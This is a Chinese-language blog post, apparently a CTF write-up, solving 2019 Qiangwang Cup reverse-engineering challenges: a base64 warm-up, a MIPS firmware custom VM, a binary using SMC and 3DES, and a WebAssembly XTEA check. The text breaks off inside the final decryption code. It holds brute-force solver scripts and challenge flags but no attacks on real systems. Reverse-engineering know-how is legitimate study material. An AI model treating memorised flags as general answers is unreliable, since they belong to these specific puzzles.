<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>xrivendell7</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="xrivendell7">
<meta property="og:url" content="http://example.com/page/4/index.html">
<meta property="og:site_name" content="xrivendell7">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="xrivendell7">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="xrivendell7" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">xrivendell7</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-qwb2019-re" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/22/qwb2019-re/" class="article-date">
  <time class="dt-published" datetime="2019-11-22T02:46:12.000Z" itemprop="datePublished">2019-11-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/22/qwb2019-re/">qwb2019-re</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2019-re-强网先锋"><a href="#2019-re-强网先锋" class="headerlink" title="2019 re 强网先锋"></a>2019 re 强网先锋</h1><p>一个简单的base64，签到题</p>
<style>.fqwwnwqrmgdm{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999333-27.png" class="fqwwnwqrmgdm" alt="img">

<p>解码即可：flag{mafakuailaiqiandaob}</p>
<h1 id="2019-re-设备固件"><a href="#2019-re-设备固件" class="headerlink" title="2019 re 设备固件"></a>2019 re 设备固件</h1><p>题目给了一个完整的文件系统镜像和一个elf文件，根据readme中所述使用以下命令模拟运行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append &quot;root=/dev/sda console=tty50&quot; </span><br></pre></td></tr></table></figure>

<p>而后在&#x2F;bin中找到目标二进制文件hello：</p>
<style>.kxvisdigilvl{zoom:80%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-1.png" class="kxvisdigilvl" alt="img">

<p>运行：</p>
<style>.jttorjgypqeu{zoom:50%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-2.png" class="jttorjgypqeu" alt="img">

<p>但是这个二进制文件在系统里面，没办法拿出来用ida查看，先想想办法把hello文件提取出来</p>
<p>采用在宿主机上挂载 ext4 镜像的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 1. 创建一个目录作为挂载点sudo mkdir /mnt/openwrt-root</span><br><span class="line"></span><br><span class="line"># 2. 使用 loop 设备挂载 ext4 镜像文件sudo mount -o loop openwrt-malta-le-root.ext4 /mnt/openwrt-root</span><br></pre></td></tr></table></figure>

<p>而后镜像文件的所有内容都暴露在 <code>/mnt/openwrt-root</code> 目录下</p>
<style>.woixhrpwhrlq{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-3.png" class="woixhrpwhrlq" alt="img">

<p>找到hello文件完成提取</p>
<style>.fsohvjulcndn{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-4.png" class="fsohvjulcndn" alt="img">

<p>首先使用file命令分析：</p>
<style>.mmtbopxtgfet{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-5.png" class="mmtbopxtgfet" alt="img">

<p>32位mips架构</p>
<p>放入ida内分析：</p>
<style>.qbibsuddstti{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-6.png" class="qbibsuddstti" alt="img">

<p>可以看到首先将输入的用户名放入v7的前40个字节中，密码放入后40个字节中，而后进入函数sub_400D48进行判断，该函数主要有两个部分，分别是函数sub_400C6C有用于验证用户名是否正确，函数sub_400CC4用于验证密码是否正确</p>
<style>.hkydugmewmmi{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-7.png" class="hkydugmewmmi" alt="img">

<p>先看函数sub_400C6C</p>
<style>.rytnxgwyftiu{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-8.png" class="rytnxgwyftiu" alt="img">

<p>很容易看出来该用户名就是直接确定了<code>dd772</code></p>
<p>只有<code>dd772</code>才能令最终v1&#x3D;&#x3D;0</p>
<p>而后看函数sub_400CC4：</p>
<style>.vstdfktzbsjt{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-9.png" class="vstdfktzbsjt" alt="img">

<p>主要逻辑在sub_400800，该函数主要是模拟虚拟机执行，有以下操作：</p>
<table>
<thead>
<tr>
<th>操作码</th>
<th>符号</th>
<th>num1</th>
<th>num2</th>
<th>行为</th>
</tr>
</thead>
<tbody><tr>
<td>0x01</td>
<td>add</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1+&#x3D;num2</td>
</tr>
<tr>
<td>0x02</td>
<td>sub</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1-&#x3D;num2</td>
</tr>
<tr>
<td>0x03</td>
<td>cmp</td>
<td>寄存器</td>
<td>寄存器</td>
<td>ZF&#x3D;(num1&#x3D;&#x3D;num2?1:2)</td>
</tr>
<tr>
<td>0x04</td>
<td>jmp</td>
<td>立即数</td>
<td>-</td>
<td>IP+&#x3D;num1</td>
</tr>
<tr>
<td>0x05</td>
<td>mov</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1&#x3D;num2</td>
</tr>
<tr>
<td>0x06</td>
<td>-</td>
<td>寄存器</td>
<td>-</td>
<td>num1&#x3D;IP</td>
</tr>
<tr>
<td>0x07</td>
<td>-</td>
<td>寄存器</td>
<td>-</td>
<td>IP&#x3D;num1</td>
</tr>
<tr>
<td>0x08</td>
<td>-</td>
<td>寄存器</td>
<td>立即数</td>
<td>num1&#x3D;nmu2</td>
</tr>
<tr>
<td>0x09</td>
<td>ret</td>
<td>-</td>
<td>-</td>
<td>返回 0</td>
</tr>
<tr>
<td>0x0A</td>
<td>load</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1&#x3D;tran_pass[num2]</td>
</tr>
<tr>
<td>0x0B</td>
<td>load</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1&#x3D;const_ARR[num2]</td>
</tr>
<tr>
<td>0x0C</td>
<td>xor</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1^&#x3D;num2</td>
</tr>
<tr>
<td>0x0D</td>
<td>imul</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1*&#x3D;num2</td>
</tr>
<tr>
<td>0x0E</td>
<td>DIV</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1&#x2F;&#x3D;num2</td>
</tr>
<tr>
<td>0x0F</td>
<td>shl</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1&lt;&lt;&#x3D;num2</td>
</tr>
<tr>
<td>0x10</td>
<td>shr</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1&gt;&gt;&#x3D;num2</td>
</tr>
<tr>
<td>0xFF</td>
<td>ret</td>
<td>-</td>
<td>-</td>
<td>返回 1</td>
</tr>
</tbody></table>
<p>然后指令就是地址4110c0 所指向的内容：</p>
<style>.usnvmkxvnfsh{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-10.png" class="usnvmkxvnfsh" alt="img">

<p>即：</p>
<table>
<thead>
<tr>
<th>地址</th>
<th>数据</th>
<th>指令</th>
</tr>
</thead>
<tbody><tr>
<td>004110c0</td>
<td>08 00 00 00 20 00</td>
<td>mov R0, 0x20</td>
</tr>
<tr>
<td>004110c6</td>
<td>08 00 01 00 00 00</td>
<td>mov R1, 0x00</td>
</tr>
<tr>
<td>004110cc</td>
<td>08 00 02 00 01 00</td>
<td>mov R2, 0x01</td>
</tr>
<tr>
<td>004110d2</td>
<td>03 00 01 00 00 00</td>
<td>cmp R1, R0</td>
</tr>
<tr>
<td>004110d8</td>
<td>04 01 16 00 00 00</td>
<td>jz +0x16</td>
</tr>
<tr>
<td>004110de</td>
<td>08 00 0b 00 00 00</td>
<td>mov RB, 0x00</td>
</tr>
<tr>
<td>004110e4</td>
<td>08 00 0c 00 00 00</td>
<td>mov RC, 0x00</td>
</tr>
<tr>
<td>004110ea</td>
<td>01 00 0c 00 0b 00</td>
<td>add RC, RB</td>
</tr>
<tr>
<td>004110f0</td>
<td>03 00 0b 00 01 00</td>
<td>cmp RB, R1</td>
</tr>
<tr>
<td>004110f6</td>
<td>01 00 0b 00 02 00</td>
<td>add RB, R2</td>
</tr>
<tr>
<td>004110fc</td>
<td>04 02 fc ff 00 00</td>
<td>jnz -0x04</td>
</tr>
<tr>
<td>00411102</td>
<td>08 00 03 00 08 00</td>
<td>mov R3, 0x08</td>
</tr>
<tr>
<td>00411108</td>
<td>08 00 04 00 06 00</td>
<td>mov R4, 0x06</td>
</tr>
<tr>
<td>0041110e</td>
<td>08 00 09 00 10 00</td>
<td>mov R9, 0x10</td>
</tr>
<tr>
<td>411114</td>
<td>0f 00 09 00 03 00</td>
<td>shl R9, R3</td>
</tr>
<tr>
<td>0041111a</td>
<td>08 00 0a 00 24 00</td>
<td>mov Ra, 0x24</td>
</tr>
<tr>
<td>411120</td>
<td>01 00 09 00 0a 00</td>
<td>add R9, Ra</td>
</tr>
<tr>
<td>411126</td>
<td>01 00 09 00 0c 00</td>
<td>add R9, RB</td>
</tr>
<tr>
<td>0041112c</td>
<td>0a 00 05 00 01 00</td>
<td>LOAD R5, R1 &#x2F;&#x2F;_pass</td>
</tr>
<tr>
<td>411132</td>
<td>0d 00 05 00 09 00</td>
<td>imul R5, R9</td>
</tr>
<tr>
<td>411138</td>
<td>05 00 06 00 05 00</td>
<td>mov R6, R5</td>
</tr>
<tr>
<td>0041113e</td>
<td>10 00 06 00 04 00</td>
<td>shr R6, R4</td>
</tr>
<tr>
<td>411144</td>
<td>0b 00 07 00 01 00</td>
<td>LOAD R7, R1 &#x2F;&#x2F;_const</td>
</tr>
<tr>
<td>0041114a</td>
<td>03 00 06 00 07 00</td>
<td>cmp R6, R7</td>
</tr>
<tr>
<td>411150</td>
<td>01 00 01 00 02 00</td>
<td>add R1, R2</td>
</tr>
<tr>
<td>411156</td>
<td>04 01 e9 ff 00 00</td>
<td>jz -0x17</td>
</tr>
<tr>
<td>0041115c</td>
<td>04 02 01 00 00 00</td>
<td>jnz +1</td>
</tr>
<tr>
<td>411162</td>
<td>ff 00 00 00 00 00</td>
<td>ret 1</td>
</tr>
<tr>
<td>411168</td>
<td>09 00 00 00 00 00</td>
<td>ret 0</td>
</tr>
<tr>
<td>0041116e</td>
<td>ff 00 00 00 00 00</td>
<td>ret 1</td>
</tr>
</tbody></table>
<p>最后推出算式<code>const_ARR[i]=(((0x10&lt;&lt;8)+0x24+ (i) )*tran_pass[i])&gt;&gt;6</code></p>
<p>但是这种直接分析太麻烦，也可以使用动态调试（推荐使用）</p>
<p>很容易就能看出算法为<code>const_ARR[i] = (input[i] * out) &gt;&gt; 6,其中out的初值为0x1024，out += 1+i</code></p>
<p>爆破一下password：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flagenc = [<span class="number">0x00000C5B</span>, <span class="number">0x00000CDD</span>, <span class="number">0x00000D1F</span>, <span class="number">0x000018C0</span>, <span class="number">0x000018C6</span>, <span class="number">0x00000C26</span>, <span class="number">0x00000E72</span>, <span class="number">0x00000DF7</span>, <span class="number">0x000019B1</span>, <span class="number">0x00000D41</span>, <span class="number">0x00000D08</span>, <span class="number">0x0000191C</span>, <span class="number">0x00000CD9</span>, <span class="number">0x00000EB1</span>, <span class="number">0x00000CEE</span>, <span class="number">0x00001A78</span>, <span class="number">0x00000D8B</span>, <span class="number">0x00000D99</span>, <span class="number">0x00000D64</span>, <span class="number">0x00000CED</span>, <span class="number">0x000019F8</span>, <span class="number">0x00000E61</span>, <span class="number">0x00001A7F</span>, <span class="number">0x00001AE7</span>, <span class="number">0x00000F26</span>, <span class="number">0x00001B34</span>, <span class="number">0x00001AD0</span>, <span class="number">0x00000D7C</span>, <span class="number">0x00000FC9</span>, <span class="number">0x00000E7E</span>, <span class="number">0x00001C0E</span>, <span class="number">0x00001BAE</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">out = <span class="number">0x1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flagenc)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">                <span class="keyword">if</span>(((j * out) &gt;&gt; <span class="number">6</span>) == flagenc[i]):</span><br><span class="line">                        flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                        <span class="built_in">print</span>(flag)</span><br><span class="line">        out += (i + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#134bb097e43b292f4431b6cd8db194db</span></span><br></pre></td></tr></table></figure>

<p>所以用户名就是dd772,密码就是134bb097e43b292f4431b6cd8db194db</p>
<p>得到flag</p>
<style>.tqtfgmnopuqh{zoom:50%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-11.png" class="tqtfgmnopuqh" alt="img">

<h1 id="2019-re-Justre"><a href="#2019-re-Justre" class="headerlink" title="2019 re Justre"></a>2019 re Justre</h1><p>A1BAAAAAAAAAAAAAAAAAAAAAAA</p>
<p>前8个A1BAAAAA为一组  xmm5中有4个</p>
<p>第二个8个，先判断是否为数字，不是的话判断是否为大写字母，是数字下面的标点以及大写字母的话v14&#x3D;16*（该字符-7），   是大写字母下面的字符的话把v14&#x3D;0，是数字前面的符号的话v14&#x3D;16*该字符</p>
<p>可能是两个字节两个字节取，如果第二个是数字则将v10&#x3D;v14+该数字，如果是大写字母v10&#x3D;v14+该字符-55</p>
<p>然后还有很长的一段的运算两种情况都需要进行</p>
<p>AA 复制16份然后每八个一份放入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00404340 xmmword_404340 xmmword 3000000020000000100000000h</span><br><span class="line">.rdata:00404340                                         ; DATA XREF: sub_401610+151↑r</span><br><span class="line">.rdata:00404350 xmmword_404350 xmmword 4000000040000000400000004h</span><br><span class="line">.rdata:00404350                                         ; DATA XREF: sub_401610+190↑r</span><br><span class="line">.rdata:00404360 xmmword_404360 xmmword 8000000080000000800000008h</span><br><span class="line">.rdata:00404360                                         ; DATA XREF: sub_401610+1B8↑r</span><br><span class="line">.rdata:00404370 xmmword_404370 xmmword 0C0000000C0000000C0000000Ch</span><br><span class="line">.rdata:00404370                                         ; DATA XREF: sub_401610+1DA↑r</span><br><span class="line">.rdata:00404380 xmmword_404380 xmmword 1010101010101010101010101010101h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data:00405018 xmmword_405018 xmmword 3D5E1084FD0E0A2CE98FBCC77AB29357h</span><br><span class="line">.data:00405018                                         ; DATA XREF: sub_401610+166↑r</span><br><span class="line">.data:00405018                                         ; sub_401610+189↑w</span><br><span class="line">.data:00405018                                         ; sub_401610:loc_401814↑r</span><br><span class="line">.data:00405018                                         ; sub_401610+212↑w</span><br><span class="line">.data:00405018                                         ; sub_401610:loc_401831↑r</span><br><span class="line">.data:00405018                                         ; sub_401610+259↑o</span><br><span class="line">.data:00405028 xmmword_405028 xmmword 3D4F7424ED150C28FB39F0A384C9FB26h</span><br><span class="line">.data:00405028                                         ; DATA XREF: sub_401610+17B↑r</span><br><span class="line">.data:00405028                                         ; sub_401610+1B1↑w</span><br><span class="line">.data:00405038 xmmword_405038 xmmword 5715BAFE28EA503D065C0BEB3CCE6C2Ah</span><br><span class="line">.data:00405038                                         ; DATA XREF: sub_401610+19B↑r</span><br><span class="line">.data:00405038                                         ; sub_401610+1ED↑w</span><br><span class="line">.data:00405048 xmmword_405048 xmmword 63184D41064DEFECAF152E2F3D4F842Bh</span><br></pre></td></tr></table></figure>

<p>AA 先被扩展为AAAAAAAA 然后再被扩展为相同的四个整数，然后每个再*01010101</p>
<p>xmm4 &#x3D; (AA*4)*01010101</p>
<p>xmm5 &#x3D; A1BAAAAA*4</p>
<p>状态变量1 0x405018 更新：</p>
<p>xmm1&#x3D;(xmm4 + 0x405018)</p>
<p>xmm2 &#x3D; (xmm5 + 0x404340)</p>
<p> 0x405018 &#x3D; xmm2 ^ xmm1</p>
<p>状态变量2 0x405028更新：</p>
<p>xmm1 &#x3D; (xmm4 + 0x405028)</p>
<p>xmm2 &#x3D; (0x404340 + 0x404350 + xmm5)</p>
<p>0x405028 &#x3D; xmm2 ^ xmm1</p>
<p>状态变量3 0x405038更新：</p>
<p>xmm1 &#x3D; (xmm4 + 0x405038)</p>
<p>xmm2 &#x3D; (0x404340 + 0x404360 + xmm5)</p>
<p>0x405038 &#x3D; xmm2 ^ xmm1</p>
<p>状态变量4 0x405048更新：</p>
<p>xmm4 &#x3D; xmm4 + 0x405048</p>
<p>xmm1 &#x3D; (0x404340 + 0x404370 + xmm5)</p>
<p>0x405048 &#x3D; xmm4 ^ xmm1</p>
<p>v2 &#x3D; A1BAAAAA v10 &#x3D; AA</p>
<p>v19&#x3D;16</p>
<p>while（v19&lt;24）{</p>
<p>*（ 0x405018 + v19 ）&#x3D; （v19 + v2）^ (16843009 * v10 + *（ 0x405018 + v19 ）);</p>
<p>++v19;</p>
<p>}</p>
<p>实际上就是input[i] &#x3D; (flag1+i) ^ (flag2 + input[i])</p>
<style>.ewxzotofyxcd{zoom:50%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-12.png" class="ewxzotofyxcd" alt="img">

<p>但是最后比较的步骤只需要关注第一个32位的部分就行了，所以除状态一外都不需要分析，因为只有两个未知量，所以用三个式子就能爆破出来。</p>
<p>最后对比的字节为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x83EC8B55, 0xEC81F0E4, 0x00000278</span><br></pre></td></tr></table></figure>

<p>所以爆破就行了：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i0 = <span class="number">0x7AB29357</span>; <span class="type">int</span> o0 = <span class="number">0x83EC8B55</span>;</span><br><span class="line">    <span class="type">int</span> i1 = <span class="number">0xE98FBCC7</span>; <span class="type">int</span> o1 = <span class="number">0xEC81F0E4</span>;</span><br><span class="line">    <span class="type">int</span> i2 = <span class="number">0xFD0E0A2C</span>; <span class="type">int</span> o2 = <span class="number">0x00000278</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">-128</span>; j != <span class="number">128</span>; j++) &#123;</span><br><span class="line">        <span class="type">int</span> flag = o0 ^ ((<span class="number">0x01010101</span> * j) + i0);</span><br><span class="line">        <span class="keyword">if</span> (o1 == ((flag + <span class="number">1</span>) ^ (<span class="number">0x01010101</span> * j + i1))</span><br><span class="line">            &amp;&amp; o2 == ((flag + <span class="number">2</span>) ^ (<span class="number">0x01010101</span> * j + i2)))</span><br><span class="line">            &#123;cout &lt;&lt; flag &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; j &lt;&lt; endl;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%X%X\n&quot;</span>, flag, j);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 前十个字符就是：1324223816</span></span><br></pre></td></tr></table></figure>

<p>然后就是后16个字符，这里的检验函数4018A0用了SMC，需要解密一下，来到4018A0使用OD将其dump出来</p>
<p>用ida打开，即可查看逻辑</p>
<style>.ylxndykxziym{zoom:80%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-13.png" class="ylxndykxziym" alt="img">

<p>查看逻辑，这里sub_401250明显是des算法，调用三次，分别是加密、解密、加密，即3DES算法</p>
<style>.vytgweobgjqu{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-14.png" class="vytgweobgjqu" alt="img">

<p>到底是不是，找个网站解密试试就知道了，发现可以解出来：</p>
<style>.giymlrvkqhxa{zoom: 50%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-15.png" class="giymlrvkqhxa" alt="img">

<p>最后放入程序验证，成功得到flag</p>
<style>.qqzxjiqsojhn{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-16.png" class="qqzxjiqsojhn" alt="img">

<p>flag{13242238160dcc509a6f75849b}</p>
<h1 id="2019-re-webAssemble"><a href="#2019-re-webAssemble" class="headerlink" title="2019 re webAssemble"></a>2019 re webAssemble</h1><p>.wasm文件逆向管用套路：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/tools/wasm2c  webassembly.wasm -o web.c</span><br><span class="line">gcc -c web.c -o web.o</span><br></pre></td></tr></table></figure>

<p>然后ida分析</p>
<style>.jsttonvxiwjs{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-17.png" class="jsttonvxiwjs" alt="img">

<p>main函数主要加密函数就这俩，f54有点复杂，先瞅瞅f15</p>
<style>.rttdnhaudagu{zoom:80%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-18.png" class="rttdnhaudagu" alt="img">

<style>.fidnitfjigls{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-19.png" class="fidnitfjigls" alt="img">

<p>观察到魔数<code>9E3779B9</code>，然后循环了32次，应该是一个循环32次的XTEA算法</p>
<p>该算法被调用了4次，四次算法密钥均为0</p>
<p>那这样的话就找找后续的对比操作，找最后需对比的字符串</p>
<style>.eouoprlbrvez{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-20.png" class="eouoprlbrvez" alt="img">

<p>可以看到后面一堆赋值操作</p>
<p>是用加密后的每一位分别异或一个值，然后取低8位，最后和前面一次算出来的值迭代相加。</p>
<style>.wnvxyqkoufgs{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-21.png" class="wnvxyqkoufgs" alt="img">

<p>然后最后判断是否相等</p>
<p>那就假设每个式子的结果为0，那么所有式子就都成立，也就是说最后经算法加密后的值为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x4e,0x6e,0xc7,0xea,</span><br><span class="line">0x8a,0x9d,0x70,0x89,//第1次xtea</span><br><span class="line"> </span><br><span class="line">0xeb,0xe2,0x45,0xd3,</span><br><span class="line">0xb8,0x4a,0xc0,0x73,//第2次xtea</span><br><span class="line"> </span><br><span class="line">0xb0,0x4a,0x40,0x71,</span><br><span class="line">0x37,0x34,0x88,0x42,//第3次xtea</span><br><span class="line"> </span><br><span class="line">0x32,0x88,0x80,0xd0,</span><br><span class="line">0x89,0xdb,0xa1,0x1e,//第4次xtea</span><br><span class="line"> </span><br><span class="line">0x35,0x38,0x39,0x31,</span><br><span class="line">0x33,0x7d//没有加密</span><br></pre></td></tr></table></figure>

<p>先找个现成的算法解密一下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, delta=<span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span 